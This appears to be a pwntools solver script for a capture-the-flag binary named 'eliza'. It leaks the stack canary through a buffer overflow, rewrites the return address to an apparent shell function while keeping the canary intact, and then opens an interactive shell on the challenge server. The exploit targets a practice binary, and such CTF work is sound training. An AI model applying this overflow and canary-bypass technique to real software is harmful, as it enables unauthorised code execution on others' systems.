#!/usr/bin/env python3

from pwn import *
from binascii import hexlify

exe = ELF("./eliza")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("eliza.challs.cyberchallenge.it", 9131)

    return r

def cycle_input(r, payload):
    print(payload)
    data = r.recvline()
    print(data)
    data = r.recvline()
    print(data)
    data = r.recvline()
    print(data)
    data = r.recvline()
    print(data)
    data = r.recvline()
    print(data)


def main():
    r = conn()
    #print(r.pid)

    # good luck pwning :)

    # canary leak
    payload = b'a'*72 + b'b'*1
    cycle_input(r, payload)
    r.send(payload)
    data = r.recvline()
    print(data)
    canary_size = 16
    canary = b'\x00' + data[8+len(payload):-48 + canary_size]
    print(b"CANARY IS: " + hexlify(canary))

    # override canary
    payload = b'a'*72 + b'b'*8
    r.send(payload)
    data = r.recvline()
    print(data)
    

    # restore canary
    payload = b'a'*72 + canary
    r.send(payload)
    data = r.recvline()
    print(data)

    # override return address without changing canary
    shell_fun_addr = p64(0x00400897)
    payload = b'a'*72 + canary + shell_fun_addr
    r.send(payload)
    data = r.recvline()
    print(data)

    # make program return
    payload = b'\n'
    r.send(payload)
    data = r.recvline()
    print(data)

    r.interactive()


if __name__ == "__main__":
    main()
